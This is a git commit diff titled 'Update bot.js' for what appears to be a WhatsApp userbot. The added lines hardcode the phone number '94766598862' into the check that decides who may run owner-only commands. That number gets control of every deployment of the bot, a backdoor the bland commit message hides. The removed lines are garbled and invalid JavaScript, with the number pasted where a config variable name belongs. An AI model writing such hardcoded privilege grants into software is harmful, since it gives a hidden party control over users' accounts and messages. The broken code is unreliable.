ea43601a9cd3c9d2fcef762d0eb536fa93505be7
jesonpro <88507137+jesonpro@users.noreply.github.com>
2021-09-03 00:54:03 +0530

    Update bot.js

--- bot.js
+++ bot.js
@@ -399,8 +399,8 @@ ${chalk.blue.italic('👾Connecting to WhatsApp...')}`);
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                    
-                   else if ((config.94766598862,0 !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.94766598862,0.includes(',') ? config.94766598862,0.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.94766598862,0 || config.94766598862,0.includes(',') ? config.94766598862,0.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.94766598862,0)
+                   else if ((OWN.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
